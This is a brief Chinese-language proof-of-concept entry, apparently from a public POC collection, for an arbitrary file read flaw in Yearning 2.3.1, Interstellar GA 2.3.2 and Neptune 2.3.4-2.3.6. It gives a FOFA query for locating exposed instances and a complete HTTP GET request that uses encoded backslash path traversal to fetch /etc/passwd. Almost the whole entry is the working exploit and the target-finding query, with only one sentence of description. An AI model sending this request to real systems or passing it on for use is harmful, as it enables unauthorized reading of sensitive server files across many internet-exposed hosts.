## Yearning_front任意文件读取

该系统Yearning 2.3.1 版本、Interstellar GA 2.3.2 版本和 Neptune 2.3.4 -2.3.6 版本存在任意文件读取漏洞。攻击者可以利用该漏洞获取敏感信息。

## fofa
```
app="Yearning"
```

## poc
```
GET /front/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
```

![9cc6509574f5743d5897ae8fe139684d](https://github.com/wy876/POC/assets/139549762/ac553904-42aa-42be-adc3-59eedc62f7f2)
